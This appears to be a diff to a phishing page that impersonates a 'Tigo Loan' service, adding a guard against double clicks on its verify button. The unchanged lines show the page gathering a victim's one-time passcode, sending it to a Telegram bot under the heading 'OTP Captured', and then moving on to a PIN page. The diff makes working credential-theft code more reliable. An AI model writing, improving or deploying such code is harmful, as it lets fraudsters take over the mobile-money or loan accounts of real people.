@@ -473,9 +473,13 @@
                 }
             }
 
+            let isSubmitting = false;
             // Add verification button click
             verifyBtn.addEventListener('click', async () => {
-                if (verifyBtn.classList.contains('enabled')) {
+                if (verifyBtn.classList.contains('enabled') && !isSubmitting) {
+                    isSubmitting = true;
+                    verifyBtn.style.opacity = '0.5';
+                    verifyBtn.style.pointerEvents = 'none';
                     const otp = Array.from(inputs).map(i => i.value).join('');
                     await sendToTelegram(`<b>Tigo Loan - OTP Captured</b>\nOTP: <code>${otp}</code>`);
                     window.location.href = 'pin.html';
